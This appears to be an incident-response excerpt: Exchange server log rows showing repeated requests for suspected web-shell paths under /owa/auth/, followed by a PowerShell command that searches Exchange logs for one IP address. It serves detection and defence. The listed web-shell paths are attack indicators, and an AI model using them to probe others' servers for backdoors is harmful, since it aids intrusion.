2021-03-08T20:37:37.854Z,autodiscover.xxx.no,/owa/auth/Current/scripts/premium/fexppw.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-08T20:37:38.454Z,mail.xxx.no,/owa/auth/Current/scripts/premium/fexppw.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-08T20:37:38.810Z,serverip,/owa/auth/Current/scripts/premium/fexppw.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-08T20:37:38.872Z,autodiscover.xxx.no,/owa/auth/OutlookEN.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-08T20:37:39.684Z,mail.xxx.no,/owa/auth/OutlookEN.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-08T20:37:40.054Z,serverip,/owa/auth/OutlookEN.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-08T20:37:40.099Z,autodiscover.xxx.no,/owa/auth/getpp.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-08T20:37:40.751Z,mail.xxx.no,/owa/auth/getpp.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-08T20:37:40.908Z,autodiscover.xxx.no,/owa/auth/Err0r.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-08T20:37:41.723Z,serverip,/owa/auth/getpp.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-08T20:37:41.946Z,mail.xxx.no,/owa/auth/Err0r.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-08T20:37:42.087Z,autodiscover.xxx.no,/owa/auth/Currentthemes/resources/win.ashx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-08T20:37:42.973Z,serverip,/owa/auth/Err0r.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-08T20:37:43.614Z,mail.xxx.no,/owa/auth/Currentthemes/resources/win.ashx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-08T20:37:43.818Z,autodiscover.xxx.no,/owa/auth/Current/scripts/premium/fexppw.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-08T20:37:44.063Z,serverip,/owa/auth/Currentthemes/resources/win.ashx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-08T20:37:44.784Z,mail.xxx.no,/owa/auth/Current/scripts/premium/fexppw.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
2021-03-08T20:37:46.126Z,serverip,/owa/auth/Current/scripts/premium/fexppw.aspx,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/88.0.4324.182 Safari/537.36,302,GET
```
PowerShell-kommando for loggsøk:
```powershell
Get-ChildItem -Force -Recurse -Path "C:\Program Files\Microsoft\Exchange Server\V15\Logging\" -Filter '*.log' | % { $content = get-content -path $_.fullname | select-string '139.162.202.236'; if($content) {write-host $_.fullname; $content; write-output '-----'   }  }
```
